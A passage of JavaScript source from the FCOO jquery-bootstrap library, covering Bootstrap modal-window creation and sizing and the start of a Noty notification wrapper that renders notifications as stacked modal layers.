                $(this).parents('.modal').first()._bsModalCloseElements();
            });

        //Add footer
        parts.$footer =
                $('<div/>')
                    .addClass('footer-content ' + className)
                    .addClass(options.footerClass)
                    .addClass(options.footerClassName)
                    .appendTo( this )
                    ._bsAddHtml( options.footer );

        //Add onClick to all elements - if nedded
        if (options.onClick){
            this.addClass('modal-' + modalSizeName[size] + '-clickable');
            if (options.fixedContent)
                $modalFixedContent.on('click', options.onClick);

            $modalContent.on('click', options.onClick);
        }

        return this;
    };


    /******************************************************
    _bsModalContent
    Create the content of a modal inside this
    Sets object with all parts of the result in this.bsModal
    ******************************************************/
    $.fn._bsModalContent = function( options = {}){
        //this.bsModal contains all created elements
        this.bsModal = {};
        this.bsModal.onChange = options.onChange || null;

        this.bsModal.transparentBackground = !!options.transparentBackground;

        //bsModal.cssHeight and bsModal.cssWidth = [size] of { width or height options}
        this.bsModal.cssHeight = {};
        this.bsModal.cssWidth  = {};
        this.bsModal.sizes = MODAL_SIZE_NORMAL;

        /*
        If the modal have flex-height ie. the height is a percent of the parent containers height
        relativeHeightOptions = {size}{relativeHeight, relativeHeightOffset, parentContainerHeight} - See above
        */
        var relativeHeightOptions = null;
        function setRelativeHeightOptions(size, options){
            var relativeOptions = null;
            if (!getHeightFromOptions(options)){
                //Save only options different from default
                $.each(['relativeHeight', 'relativeHeightOffset', 'parentContainerHeight'], function(index, id){
                    var value = options[id];
                    if (value || (value === 0)){
                        relativeOptions = relativeOptions || {};
                        relativeOptions[id] = value;
                    }
                });

                if (relativeOptions){
                    relativeHeightOptions = relativeHeightOptions || {};
                    relativeHeightOptions[size] = relativeOptions;
                }
            }
        }

        //Set bsModal.cssHeight
        this.bsModal.cssHeight[MODAL_SIZE_NORMAL] = getHeightFromOptions( options );
        setRelativeHeightOptions(MODAL_SIZE_NORMAL, options);


        if (options.minimized){
            this.bsModal.sizes += MODAL_SIZE_MINIMIZED;
            this.bsModal.cssHeight[MODAL_SIZE_MINIMIZED] = getHeightFromOptions(options.minimized);
            setRelativeHeightOptions(MODAL_SIZE_MINIMIZED, options.minimized);
        }

        if (options.extended){
            this.bsModal.sizes += MODAL_SIZE_EXTENDED;
            if (options.extended.height == true){
                this.bsModal.cssHeight[MODAL_SIZE_EXTENDED] = this.bsModal.cssHeight[MODAL_SIZE_NORMAL];
                setRelativeHeightOptions(MODAL_SIZE_EXTENDED, options);
            }
            else {
                this.bsModal.cssHeight[MODAL_SIZE_EXTENDED] = getHeightFromOptions( options.extended );
                setRelativeHeightOptions(MODAL_SIZE_EXTENDED, options.extended);
            }
        }

        //Set bsModal.cssWidth
        this.bsModal.cssWidth[MODAL_SIZE_NORMAL] = getWidthFromOptions( options );

        if (options.minimized)
            this.bsModal.cssWidth[MODAL_SIZE_MINIMIZED] = getWidthFromOptions(options.minimized);

        if (options.extended){
            //If options.extended.width == true or none width-options is set in extended => use same width as normal-mode
            if ( (options.extended.width == true) ||
                 ( (options.extended.flexWidth == undefined) &&
                   (options.extended.extraWidth == undefined) &&
                   (options.extended.megaWidth == undefined) &&
                   (options.extended.maxWidth == undefined) &&
                   (options.extended.fullWidth == undefined) &&
                   (options.extended.fullScreen == undefined) &&
                   (options.extended.fullScreenWithBorder == undefined) &&
                   (options.extended.width == undefined)
                 )
              )
                this.bsModal.cssWidth[MODAL_SIZE_EXTENDED] = this.bsModal.cssWidth[MODAL_SIZE_NORMAL];
            else
                this.bsModal.cssWidth[MODAL_SIZE_EXTENDED] = getWidthFromOptions( options.extended );
        }

        var $modalContent = this.bsModal.$modalContent =
                $('<div/>')
                    .addClass('modal-content')
                    .addClass(options.modalContentClassName)
                    .toggleClass('no-shadow', !!options.noShadow)
                    .modernizrOff('modal-pinned')
                    .appendTo( this );

        //Set modal-[SIZE]-[STATE] class
        function setStateClass(postClassName, optionId){
            $modalContent
                .toggleClass('modal-minimized-'+postClassName, !!options.minimized && !!options.minimized[optionId])
                .toggleClass('modal-normal-'+postClassName,    !!options[optionId])
                .toggleClass('modal-extended-'+postClassName,  !!options.extended && !!options.extended[optionId]);
        }
        //Add class to make content always max-height
        setStateClass('always-max-height', 'alwaysMaxHeight');
        //Add class to make content clickable
        setStateClass('clickable', 'clickable');
        //Add class to make content semi-transparent
        setStateClass('semi-transparent', 'semiTransparent');

        //Save info on relative height
        if (relativeHeightOptions)
            $modalContent.data('relativeHeightOptions', relativeHeightOptions);

        var initSize =  options.minimized && options.isMinimized ?
                            MODAL_SIZE_MINIMIZED :
                        options.extended && options.isExtended ?
                            MODAL_SIZE_EXTENDED :
                            MODAL_SIZE_NORMAL;

        this._bsModalSetSizeClass(initSize);
        this._bsModalSetHeightAndWidth();

        var modalExtend       = $.proxy( this._bsModalExtend,       this),
            modalDiminish     = $.proxy( this._bsModalDiminish,     this),
            modalToggleHeight = $.proxy( this._bsModalToggleHeight, this),
            modalPin          = $.proxy( this._bsModalPin,          this),
            modalUnpin        = $.proxy( this._bsModalUnpin,        this),
            iconExtendClassName   = '',
            iconDiminishClassName = '',
            multiSize = this.bsModal.sizes > MODAL_SIZE_NORMAL;

        //If multi size: Set the class-name for the extend and diminish icons.
        if (multiSize){
            iconExtendClassName   = this.bsModal.sizes & MODAL_SIZE_EXTENDED  ? 'hide-for-modal-extended'  : 'hide-for-modal-normal';
            iconDiminishClassName = this.bsModal.sizes & MODAL_SIZE_MINIMIZED ? 'hide-for-modal-minimized' : 'hide-for-modal-normal';
        }

        this.bsModal.onPin = options.onPin;
        this.bsModal.isPinned = false;

        options = $.extend( true, {
            headerClassName     : 'modal-header',
            //Buttons
            buttons             : [],
            closeButton         : true,
            closeText           : {da:'Luk', en:'Close'},
            closeIcon           : 'fa-times',
            noCloseIconOnHeader : false,

            //Icons
            icons    : {
                pin     : { className: 'hide-for-modal-pinned', onClick: options.onPin ? modalPin      : null },
                unpin   : { className: 'show-for-modal-pinned', onClick: options.onPin ? modalUnpin    : null },
                extend  : { className: iconExtendClassName,     onClick: multiSize ? modalExtend   : null, altEvents:'swipeup'   },
                diminish: { className: iconDiminishClassName,   onClick: multiSize ? modalDiminish : null, altEvents:'swipedown' },
                new     : { className: '',                      onClick: options.onNew ? $.proxy(options.onNew, this) : null },
                info    : { className: '',                      onClick: options.onInfo ? $.proxy(options.onInfo, this) : null },
                warning : { className: '',                      onClick: options.onWarning ? $.proxy(options.onWarning, this) : null },
                help    : { className: '',                      onClick: options.onHelp ? $.proxy(options.onHelp, this) : null },
            }
        }, options );


        //Save parentOptions for dynamic update
        var parentOptions = this.bsModal.parentOptions = {};
        $.each($.parentOptionsToInherit, function(index, id){
            if (options.hasOwnProperty(id))
                parentOptions[id] = options[id];
            });


        //Adjust for options.buttons: null
        options.buttons = options.buttons || [];

        //Hide the close icon on the header
        if (options.noCloseIconOnHeader && options.icons && options.icons.close)
            options.icons.close.hidden = true;

        //Add close-botton at beginning. Avoid by setting options.closeButton = false
        if (options.closeButton)
            options.buttons.unshift({
                text: options.closeText,
                icon: options.closeIcon,

                closeOnClick: true,
                addOnClick  : false
            });

        /*
        If the modal has extended content and neither normal or extended content is tabs =>
            Normal and extended content get same scroll-options to have same horizontal padding in normal and extended mode
        */
        if (options.content && (options.content.type != "tabs") && options.extended && (options.extended.content.type != "tabs")){
            options.scroll = options.scroll || options.extended.scroll;
            options.extended.scroll = options.scroll;
        }

        //Append header
        if (!options.noHeader &&  (options.header || !$.isEmptyObject(options.icons) ) ){
            var $modalHeader = this.bsModal.$header =
                    $('<div/>')
                        ._bsHeaderAndIcons( options )
                        .appendTo( $modalContent );

            //Add dbl-click on header to change to/from extended
            if (options.minimized || options.extended)
                $modalHeader
                    .addClass('clickable')
                    .on('doubletap', modalToggleHeight );
        }

        //If options.extended.fixedContent == true and/or options.extended.footer == true => normal and extended uses same fixed and/or footer content
        _updateFixedAndFooterInOptions(options);

        //Create minimized content
        if (options.minimized){
            this.bsModal.minimized = {};
                $modalContent.addClass('modal-minimized-hide-header');
                var bsModalToggleMinimizedHeader = $.proxy(this._bsModalToggleMinimizedHeader, this);
                options.minimized.onClick =
                    options.minimized.showHeaderOnClick ?
                        bsModalToggleMinimizedHeader :
                        modalExtend;

            //Close header when a icon is clicked
            if (options.minimized.showHeaderOnClick)
                this.bsModal.$header.on('click', bsModalToggleMinimizedHeader);

            $modalContent._bsModalBodyAndFooter( MODAL_SIZE_MINIMIZED/*'minimized'*/, options.minimized, this.bsModal.minimized, '', initSize, parentOptions );

            if (options.minimized.showHeaderOnClick){
                //Using fixed-height as height of content
                var cssHeight = this.bsModal.cssHeight[MODAL_SIZE_MINIMIZED];
                if (cssHeight && cssHeight.height)
                    this.bsModal.minimized.$content.height(cssHeight.height);

                this.bsModal.cssHeight[MODAL_SIZE_MINIMIZED] = null;
            }
        }

        //Create normal content
        if (options.clickable && !options.onClick)
            //Set default on-click
            options.onClick =
                options.extended ?
                    modalExtend :
                options.minimized ?
                    modalDiminish :
                    null;

        $modalContent._bsModalBodyAndFooter(MODAL_SIZE_NORMAL/*'normal'*/, options, this.bsModal, '', initSize, parentOptions);

        //Create extended content (if any)
        if (options.extended){
            this.bsModal.extended = {};
            if (options.extended.clickable)
                options.extended.onClick = options.extended.onClick || modalDiminish;
            $modalContent._bsModalBodyAndFooter( MODAL_SIZE_EXTENDED/*'extended'*/, options.extended, this.bsModal.extended, '', initSize, parentOptions);
        }

        //Add buttons (if any). Allways hidden for minimized. Need to add outer-div ($outer) to avoid
        //that $modalButtonContainer is direct children since show-for-modal-XX overwrite direct children display: flex with display: initial
        var $outer = $('<div/>').appendTo( $modalContent ),
            $modalButtonContainer = this.bsModal.$buttonContainer =
                $('<div/>')
                    .addClass('modal-footer')
                    .appendTo( $outer ),
            $modalButtons = this.bsModal.$buttons = [],

            buttons = options.buttons || [],
            defaultButtonOptions = {
                addOnClick  : true,
                small       : options.smallButtons
            };

        //Detect if the buttons need to be a block (width: 100%) and if it is for all size or not
        if (options.verticalButtons || (options.extended && options.extended.verticalButtons)){
            var verticalButtonsClass = 'vertical-buttons';
            if (options.extended){
                if (options.verticalButtons && (options.extended.verticalButtons === false))
                    //Only vertical buttons in mode = normal
                    verticalButtonsClass = 'vertical-buttons-for-normal';

                if (!options.verticalButtons && options.extended.verticalButtons)
                    //Only vertical buttons in mode = extended
                    verticalButtonsClass = 'vertical-buttons-for-extended';
            }

            $modalButtonContainer.addClass( verticalButtonsClass );
        }

        //If extende-content and extended.buttons = false => no buttons in extended
        if (options.extended && (options.extended.buttons === false))
            $modalButtonContainer.addClass('show-for-modal-normal');
        else
            $modalButtonContainer.addClass('show-for-no-modal-minimized');

        //If no button is given focus by options.focus: true => Last button gets focus
        var focusAdded = false;
        $.each( buttons, function( index, buttonOptions ){
            if (buttonOptions instanceof $){
                buttonOptions.appendTo( $modalButtonContainer );
                $modalButtons.push( buttonOptions );
            }
            else {
                focusAdded = focusAdded || buttonOptions.focus;
                if (!focusAdded && (index+1 == buttons.length ) )
                    buttonOptions.focus = true;

                //Add same onClick as close-icon if closeOnClick: true
                if (buttonOptions.closeOnClick)
                    buttonOptions.equalIconId = (buttonOptions.equalIconId || '') + ' close';

                buttonOptions.class = buttonOptions.class || buttonOptions.className || '';

                var $button =
                    $._anyBsButton( $.extend({}, defaultButtonOptions, buttonOptions ) )
                        .appendTo( $modalButtonContainer );

                //Add onClick from icons (if any)
                buttonOptions.equalIconId = buttonOptions.equalIconId || '';
                $.each( buttonOptions.equalIconId.split(' '), function( index, iconId ){
                    if (iconId && options.icons[iconId] && options.icons[iconId].onClick)
                        $button.on('click', options.icons[iconId].onClick);
                });

                $modalButtons.push( $button );
            }
        });
        return this;
    };


    /******************************************************
    *******************************************************
    Set/change size-mode
    *******************************************************
    ******************************************************/
    function get$modalContent( $elem ){
        var bsModal = $elem.bsModal || $elem;
        return bsModal.$modalContent || $elem;
    }

    /******************************************************
    _bsModalSetSizeClass(size) - Set the class-name according to size
    ******************************************************/
    $.fn._bsModalSetSizeClass = function(size){
        return get$modalContent(this)
                   .modernizrToggle(modalSizeClassName[MODAL_SIZE_MINIMIZED], size == MODAL_SIZE_MINIMIZED )
                   .modernizrToggle(modalSizeClassName[MODAL_SIZE_NORMAL],    size == MODAL_SIZE_NORMAL)
                   .modernizrToggle(modalSizeClassName[MODAL_SIZE_EXTENDED],  size == MODAL_SIZE_EXTENDED );
    };

    $.fn._bsModalGetSize = function(){
        var $modalContent = get$modalContent(this);
        return $modalContent.hasClass(modalSizeClassName[MODAL_SIZE_MINIMIZED]) ?
                   MODAL_SIZE_MINIMIZED :
               $modalContent.hasClass(modalSizeClassName[MODAL_SIZE_NORMAL]) ?
                   MODAL_SIZE_NORMAL :
                   MODAL_SIZE_EXTENDED;
    };

    /******************************************************
    _bsModalSetHeightAndWidth - Set the height and width according to current cssHeight and cssWidth
    ******************************************************/
    $.fn._bsModalSetHeightAndWidth = function(){

        var bsModal = this.bsModal,
            $modalContent = get$modalContent(this),
            $modalDialog = $modalContent.parent(),
            size = $modalContent._bsModalGetSize(),
            cssHeight = bsModal.cssHeight[size],
            cssWidth = bsModal.cssWidth[size];

        //Set height
        $modalContent
            .toggleClass('modal-fixed-height', !!cssHeight)
            .toggleClass('modal-flex-height', !cssHeight)
            .css( cssHeight ? cssHeight : {height: 'auto', maxHeight: null});
        if (!cssHeight)
            adjustModalMaxHeight( $modalContent );

        //Set width
        $modalDialog
            .toggleClass('modal-flex-width'             , cssWidth.flexWidth            )
            .toggleClass('modal-extra-width'            , cssWidth.extraWidth           )
            .toggleClass('modal-mega-width'             , cssWidth.megaWidth            )
            .toggleClass('modal-max-width'              , cssWidth.maxWidth             )
            .toggleClass('modal-full-width'             , cssWidth.fullWidth            )
            .toggleClass('modal-full-screen'            , cssWidth.fullScreen           )
            .toggleClass('modal-full-screen-with-border', cssWidth.fullScreenWithBorder )
            .css('width', cssWidth.width ? cssWidth.width : '' );

        //Call onChange (if any)
        if (bsModal.onChange)
            bsModal.onChange( bsModal );
    };

    /******************************************************
    _bsModalExtend, _bsModalDiminish, _bsModalToggleHeight,
    _bsModalSetSize, _bsModalToggleMinimizedHeader
    Methods to change extended-mode
    ******************************************************/
    $.fn._bsModalExtend = function(){
        return this._bsModalSetSize( this._bsModalGetSize() == MODAL_SIZE_MINIMIZED ? MODAL_SIZE_NORMAL : MODAL_SIZE_EXTENDED);
    };

    $.fn._bsModalDiminish = function(){
        return this._bsModalSetSize( this._bsModalGetSize() == MODAL_SIZE_EXTENDED ? MODAL_SIZE_NORMAL : MODAL_SIZE_MINIMIZED);
    };

    //Shift between normal and extended size
    //minimized -> normal, extended -> normal, normal -> extended (if any) else -> minimized
    $.fn._bsModalToggleHeight = function(){
        var newSize = this._bsModalGetSize() == MODAL_SIZE_NORMAL ?
                        (this.bsModal.sizes & MODAL_SIZE_EXTENDED ? MODAL_SIZE_EXTENDED : MODAL_SIZE_MINIMIZED) :
                        MODAL_SIZE_NORMAL;
        this._bsModalSetSize(newSize);
    };

    //Set new size of modal-window
    $.fn._bsModalSetSize = function(size){
        //Check to see if the content of the new size need to be created dynamically
        var parts = this.bsModal[ modalSizeName[size] ] || this.bsModal;

        if (parts && parts.dynamicContent){
            parts.$content._bsAppendContent( parts.dynamicContent, parts.dynamicContentContext, parts.dynamicContentArg, this.bsModal.parentOptions );

            parts.dynamicContent        = null;
            parts.dynamicContentContext = null;
            parts.dynamicContentArg     = null;
        }

        this._bsModalSetSizeClass(size);
        this._bsModalSetHeightAndWidth();


        /*
        NOTE: 2021-04-16
        Original this methods returns false to prevent onclick-event on the header.
        That prevented other more general events to be fired. Eg. in fcoo/leaflet-bootstrap
        where the focus of a popup window was set when the window was clicked
        It appear not to have any other effect when removed.
        */
        //return false; //Prevent onclick-event on header
    };

    //hid/show header for size = minimized
    $.fn._bsModalToggleMinimizedHeader = function(){
        if (this._bsModalGetSize() == MODAL_SIZE_MINIMIZED)
            get$modalContent(this).toggleClass('modal-minimized-hide-header');
    };

/* TODO: animate changes in height and width - Use Bootstrtap 5 collaps
       var $this = this.bsModal.$container,
            oldHeight = $this.outerHeight(),
            newHeight;

        $this.modernizrToggle(modalSizeClassName[MODAL_SIZE_EXTENDED]);

        newHeight = $this.outerHeight();
        $this.height(oldHeight);

        $this.animate({height: newHeight}, 'fast', function() { $this.height('auto'); });
*/

    /******************************************************
    _bsModalPin, _bsModalUnpin, _bsModalTogglePin
    Methods to change pinned-status
    ******************************************************/
    $.fn._bsModalPin = function(){
        return this.bsModal.isPinned ? false : this._bsModalTogglePin();
    };
    $.fn._bsModalUnpin = function( /*event*/ ){
        return this.bsModal.isPinned ? this._bsModalTogglePin() : false;
    };
    $.fn._bsModalTogglePin = function( /*event*/ ){
        var $modalContent = this.bsModal.$modalContent;
        this.bsModal.isPinned = !this.bsModal.isPinned;
        $modalContent.modernizrToggle('modal-pinned', !!this.bsModal.isPinned);

        return this.bsModal.onPin( this.bsModal.isPinned );
    };



    //bsModal_updateIcons_historylist - Updates backward- and forward-icons in modal-header according to status of historyList
    function bsModal_updateIcons_historylist( backAvail, forwardAvail, historyList ){
        if (historyList.lastIndex <= 0) return;

        //Show icons
        this.getHeaderIcon('back').css('visibility', 'initial');
        this.getHeaderIcon('forward').css('visibility', 'initial');

        //Update icons
        this.setHeaderIconEnabled('back'   , !backAvail );
        this.setHeaderIconEnabled('forward', !forwardAvail );
    }

    /******************************************************
    bsModal
    ******************************************************/
    $.bsModal = function( options ){
        var $result, $modalDialog;
        //Adjust options
        options =
            $._bsAdjustOptions( options, {
                baseClass: 'modal-dialog',

                //Header
                noHeader : false,

                //Size
                useTouchSize: true,

                //Content
                scroll     : true,
                content    : '',

                //Modal-options
                static     : false,
                show       : true
            });

        //Adjust options by MODEL_ADJUST_OPTIONS
        options = $.MODAL_ADJUST_OPTIONS(options, this);

        //Set default removeOnClose
        if ( (options.defaultRemoveOnClose || options.defaultRemove) &&
             (options.remove === undefined) &&
             (options.removeOnClose === undefined) )
            options.remove = !!options.defaultRemoveOnClose || !!options.defaultRemove;

        //Set options for full screen with border
        if (options.fullScreenWithBorder)
            options.fullScreen = true;

        //Set options for full screen
        if (options.fullScreen){
            options.maxWidth             = true;
            options.alwaysMaxHeight      = true;
            options.relativeHeightOffset = 0;
        }

        //Check $.MODAL_NO_VERTICAL_MARGIN
        if ($.MODAL_NO_VERTICAL_MARGIN){
            options.relativeHeightOffset = 0;
            if (options.extended)
                options.extended.relativeHeightOffset = 0;
        }


        //Create the modal
        $result =
            $('<div/>')
                .addClass('modal')
                .attr({
                    'id'         : options.id || '_bsModal'+ modalId++,
                    'tabindex'   : -1,
                    'role'       : "dialog",
                    'aria-hidden': true
                });

        $modalDialog =
            $('<div/>')
                ._bsAddBaseClassAndSize( options )
                .attr( 'role', 'document')
                .appendTo( $result );

        //Extend with prototype
        $result.extend( bsModal_prototype );

        //Add close-icon and create modal content
        options.icons = options.icons || {};
        options.icons.close = $.extend(true, options.icons.close, { onClick: $.proxy( bsModal_prototype.close, $result) } );

        //Add backward- and forward-icons and update-function if modal is connected to a historyList
        if (options.historyList){
            options.icons.back    = {onClick: function(){ options.historyList.goBack();    }};
            options.icons.forward = {onClick: function(){ options.historyList.goForward(); }};

            options.historyList.options.onUpdate = $.proxy( bsModal_updateIcons_historylist, $result );
        }

        //Create modal content
        $modalDialog._bsModalContent( options );
        $result.data('bsModalDialog', $modalDialog);

        $result.onShow = options.onShow;
        $result.onClose = options.onClose;

        //Create as modal and adds methods - only allow close by esc for non-static modal (typical a non-form)
        new bootstrap.Modal($result, {
           //Name       Value                                   Type                Default Description
           backdrop :   options.static ? "static" : true,   //  boolean or 'static' true	Includes a modal-backdrop element. Alternatively, specify static for a backdrop which doesn't close the modal on click.
           keyboard :   !options.static,                    //  boolean	            true	Closes the modal when escape key is pressed
           focus	:   true,                               //  boolean	            true    Puts the focus on the modal when initialized.
           show	    :   false                               //  boolean	            true	Shows the modal when initialized.
        });
        $result.bsModal = $modalDialog.bsModal;

        $result.removeOnClose = options.remove || options.removeOnClose;

        if (options.historyList){
            //Hide back- and forward-icons
            $result.getHeaderIcon('back').css('visibility', 'hidden');
            $result.getHeaderIcon('forward').css('visibility', 'hidden');
        }

        $result.on({
            'show.bs.modal'  : $.proxy(show_bs_modal, $result),//show_bs_modal,
            'shown.bs.modal' : shown_bs_modal,
            'hide.bs.modal'  : $.proxy(hide_bs_modal, $result),
            'hidden.bs.modal': hidden_bs_modal
        });

        $result.appendTo( $('body') );

        if (options.show)
            $result.show();
        return $result;
    };

}(jQuery, this.bootstrap, this, document));
;
/****************************************************************************
	jquery-bootstrap-noty.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($, Noty, window, document, undefined) {
	"use strict";


    /******************************************************
    To be able to have Noty on top of modal-windows the notys are
    placed in different containers with increasing and decreasing
    z-index.
    A new container is added when a modal-window or modal-noty is open
    All noty in the top container is closed when the modal-window or
    modal noty is closed. E.q. all noty opened on top of a modal-window is automatic
    closed when the modal-window is closed
    If options.onTop: true the noty is placed in a container that is allways on the top of other elements
    ******************************************************/

    var bsNotyLayerList   = [],
        $bsNotyLayer      = null,
        $bsNotyLayerOnTop = null;

    //Global pointer to current modal noty (if any)
    window._bsNotyModal = null;

    //Add global event-function to close modal-noty by pressing esc
    $(document).keydown( function( event ){
        if (window._bsNotyModal && (event.which == 27))
            window._bsNotyModal.close();
    });


    function notyQueueName(isOnTopLayer){
        return 'bsNotyQueue'+ (isOnTopLayer ? 'ONTOP' : bsNotyLayerList.length);
    }

    //$._bsNotyAddLayer: add a new container for noty-containers
    $._bsNotyAddLayer = function( isOnTopLayer, className ){

        var $result =
            $('<div/>')
                .addClass('noty-layer')
                .appendTo( $('body') );

        if (!isOnTopLayer)
            bsNotyLayerList.push( $result );

        $result
            .attr('id', notyQueueName( isOnTopLayer ))
            ._setModalBackdropZIndex( isOnTopLayer, className );

        if (isOnTopLayer)
            $bsNotyLayerOnTop = $result;
        else
            $bsNotyLayer = $result;
    };


    //$._bsNotyRemoveLayer: close all noty in current layer and remove the layer
    $._bsNotyRemoveLayer = function(){
        //Close all noty in current layer
        Noty.closeAll(notyQueueName());

        //Remove the layer
        bsNotyLayerList.pop().remove();

        $bsNotyLayer = bsNotyLayerList[ bsNotyLayerList.length - 1];

        //Move down or hide the backdrop
        $._removeModalBackdropLevel( true );
    };


    /******************************************************
    Extend Noty with flash
    Turn flashing on for 3s
    ******************************************************/
    Noty.prototype.flash  = function(){
        var $barDom = $(this.barDom);
        if ($barDom.hasClass('flash')){
            //Restart thr animation
            //Thank to https://css-tricks.com/restart-css-animation/
            $barDom.removeClass('flash');
            void $barDom.find('.noty_body').get(0).offsetWidth;
            $barDom.addClass('flash');
        }
        else
            $barDom.addClass('flash');
        return this;
    };

    /******************************************************
    Setting default options for Noty
    ******************************************************/
    Noty.overrideDefaults({
        theme: 'jquery-bootstrap'
    });

    var defaultNotyOptions = {
        layout   : 'topCenter',
        type     : 'info',
        closeWith: ['click'],
        textAlign: 'left',
        onTop    : false,
        show     : true,
    };


    $.bsNoty = function(options){
        options = $.extend({}, defaultNotyOptions, options );

        if (options.type == 'information')
            options.type = 'info';

        //Set animation from layout
        var animateOpen = 'fadeIn',
            animateClose = 'fadeOut';
        if (options.layout.indexOf('top') == 0){
            //top, topLeft, topCenter, topRight
            animateOpen  = 'fadeInDown';
            animateClose = 'fadeOutUp';
        }
        else
        if (options.layout.indexOf('bottom') == 0){
            //bottom, bottomLeft, bottomCenter, bottomRight
            animateOpen  = 'fadeInUp';
            animateClose = 'fadeOutDown';
        }
        else
        if (options.layout == 'centerLeft'){
            //centerLeft
            animateOpen  = 'fadeInLeft';
            animateClose = 'fadeOutLeft';
        }
        else
        if (options.layout == 'centerRight'){
            //centerRight
            animateOpen  = 'fadeInRight';
            animateClose = 'fadeOutRight';
        }
        else
        if (options.layout == 'center'){
            //centerRight
            animateOpen  = 'fadeIn';
            animateClose = 'fadeOut';
        }

        if (options.animation == undefined)
            options.animation = {
                open : 'animated ' + animateOpen,
                close: 'animated ' + animateClose
            };


        //Save buttons and remove if from options to prevent default buttons
        var buttons = options.buttons;
        options.buttons = null;

        //Save closeWith and remove 'button' to prevent default close-button
        var closeWith = options.closeWith,
            closeWithButton = closeWith.indexOf('button') >= 0,
            closeWithClick = closeWith.indexOf('click') >= 0,
            headerOptions = null;

        //Adjust closeWith
        if (options.buttons)
            closeWithClick = false;

        //Set options.closeWith with not-empty content to allow closing by other notys
        options.closeWith = closeWithClick ? ['click'] : closeWithButton ? ['NoEmpty'] : [];


        //Save show and create the noty hidden
        var show = options.show;
        options.show = false;

        //Create the noty empty and create the content in options.content
        options.content = options.content || $._bsAdjustIconAndText(options.text);
        options.text = '';

        //Add header (if any)
        if (options.header || options.defaultHeader){
            if (!$.isArray(options.content))
                options.content = [options.content];

            options.header = $._bsAdjustIconAndText(options.header) || {};

            headerOptions =
                options.defaultHeader ?
                $.extend({},
                    {
                        icon: $.bsNotyIcon[options.type],
                        text: $.bsNotyName[options.type]
                    }, options.header || {})
                : options.header || {};
        }

        //Force no progressBar
        options.progressBar = false;

        /***********************************************************
        ************************************************************
        ** NOTE                                                   **
        ** There seem to be a error on Mac and some mobile device **
        ** when using insertAdjacentHTML on elements              **
        ** The only place this command is used is in noty when    **
        ** options.force = false                                  **
        ** Therefore options.force is always set to true          **
        ************************************************************
        ************************************************************/
        options.force = true;

        //Add callbacks.onTemplate to add content (and close-icon) by converting the noty uinto a Bootstrap modal
        options.callbacks = options.callbacks || {};
        options.callbacks.onTemplate = function() {
            var _this           = this,
                $barDom         = $(this.barDom),
                $body           = $barDom.find('.noty_body'),
                closeFunc       = function( event ){
                                      event.stopPropagation();
                                      _this.close();
                                   },
                headerClassName = 'modal-header',
                icons           = {close: { onClick: closeFunc } };

            //$barDom acks as .modal-dialog
            var $modalDialog = $barDom;
            $modalDialog.addClass('modal-dialog ' + $._bsGetSizeClass({useTouchSize: true, baseClass: 'modal-dialog'}) );

            var $modalContent =
                    $('<div/>')
                        .addClass('modal-content')
                        .appendTo($modalDialog);

            //$body acks as modal-body
            var $modalBody = $body;
            $modalBody
                .detach()
                .addClass('modal-body')
                .appendTo($modalContent);

            //Insert header before $modalBody (if any)
            if (headerOptions)
                $('<div/>')
                    ._bsHeaderAndIcons({
                        headerClassName: headerClassName,
                        header         : headerOptions,
                        icons          : closeWithButton ? icons : null
                    })
                    .insertBefore( $modalBody );
            else
                $modalDialog.addClass('no-header');



            //Replace content with text as object {icon, txt,etc}
            $modalBody._bsAddHtml( options.content, true );
            $modalBody.addClass('text-'+options.textAlign);

            //Add buttons (if any)
            if (buttons){
                var $buttonContainer =
                        $('<div/>')
                            .addClass('modal-footer')
                            .insertAfter($body),
                    defaultButtonOptions = {
                        closeOnClick: true
                    };

                $.each( buttons, function( index, buttonOptions ){
                    buttonOptions = $.extend(true, defaultButtonOptions, buttonOptions );
                    var $button = $.bsButton(buttonOptions).appendTo($buttonContainer);
                    if (buttonOptions.closeOnClick)
                        $button.on('click', closeFunc );
                });
            }

            //Add footer (if any)
            if (options.footer){
                $('<div/>')
                    .addClass('modal-footer footer-content')
                    .addClass('text-' + (options.footer.textAlign || 'left'))
                    ._bsAddHtml( options.footer )
                    .insertAfter($body);
            }

            if (!headerOptions && closeWithButton)
                //Add same close-icon as for modal-windows
                $('<div/>')
                    .css('display', 'contents')
                    .appendTo( $modalContent )
                    ._bsHeaderAndIcons({
                        inclHeader     : false,
                        headerClassName: headerClassName,
                        icons          : icons
                    });
        };


        var $bsNotyLayerToUse; //The noty-layer to contain the noty

        //If it is a modal noty => add/move up backdrop
        if (options.modal)
            $._addModalBackdropLevel();

        //Find or create layer and container for the noty
        if (options.onTop){
            if (!$bsNotyLayerOnTop)
                $._bsNotyAddLayer(true, options.onTopLayerClassName);
            $bsNotyLayerToUse = $bsNotyLayerOnTop;
        }
        else {
            if (!$bsNotyLayer || options.modal)
                $._bsNotyAddLayer();
            $bsNotyLayerToUse = $bsNotyLayer;
        }

        var classNames = '.modal.noty-container.noty-container-'+options.layout,
            $container = $bsNotyLayerToUse.find(classNames);
        if (!$container.length){
            $container =
                $('<div/>')
                    .addClass( classNames.split('.').join(' ') )
                    .appendTo( $bsNotyLayerToUse );
        }

        options.container = '#' + notyQueueName(options.onTop) + ' ' + classNames;

        var result = new Noty( options );

        //If options.flash => flash on show
        if (options.flash)
            result.on('onShow', result.flash, result );


        //If it is a modal noty => remove/move down backdrop when closed
        if (options.modal){
            result.on('afterClose', $._bsNotyRemoveLayer);

            result.on('onShow', function(){
                this.prevBsNotyModal = window._bsNotyModal;
                window._bsNotyModal = this;
            });
            result.on('afterClose', function(){
                window._bsNotyModal = this.prevBsNotyModal;
            });

        }

        if (show)
            result.show();

        return result;
    };


    /********************************************************************
    *********************************************************************
    Create standard variations of bsNoty:
    notySuccess/notyOk, notyError, notyWarning, notyAlert, notyInfo (and dito $bsNoty[TYPE]
    The following default options is used
    queue: "global" but if != "global" options.killer is set to options.queue
    killer: if options.queue != "global" => killer = queue and the noty will close all noty with same queue.
            To have unique queue and prevent closing: set options.killer: false
            To close all noty set options.killer: true
    timeout: If type="warning" or "success" timeout is set to 3000ms. Can be avoided by setting options.timeout: false
    defaultHeader: If type = "error": defaultHeader = true
    textAlert: left if any header else center
    closeWith: if the noty has buttons then only button else only click
    *********************************************************************
    *********************************************************************/
    //$.bsNotyIcon = icon-class for different noty-type
    $.bsNotyIcon = {
        info        : 'fa-info-circle',
        information : 'fa-info-circle',
        alert       : '',
        success     : 'fa-check',
        error       : 'fa-ban',
        warning     : 'fa-exclamation-triangle',
        help        : 'fa-question-circle'
    };

    //$.bsNotyName = Name for different noty-type
